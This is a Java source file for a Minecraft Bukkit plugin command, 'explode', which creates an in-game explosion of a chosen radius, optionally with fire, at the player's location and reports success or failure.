package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Explode implements Command {
    @Override
    public boolean playerOnly() {
        return true;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"explode"};
    }

    @Override
    public String getDescription() {
        return "Explodes where you are standing.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        // Format: explode <radius> (fire)

        float radius = 4f;
        if (args.length > 0) {
            try {
                radius = Float.parseFloat(args[0]);
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "explode (radius) (fire true|false)");
                return;
            }
        }


        boolean setFire = false;
        if (args.length > 1) {
            try {
                setFire = Boolean.parseBoolean(args[1]);
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            }
        }

        float finalRadius = radius;
        boolean finalSetFire = setFire;
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            try {
                executor.getWorld().createExplosion(executor.getLocation(), finalRadius, finalSetFire);
                sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully created an explosion at your location!");
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            }
        });
    }
}
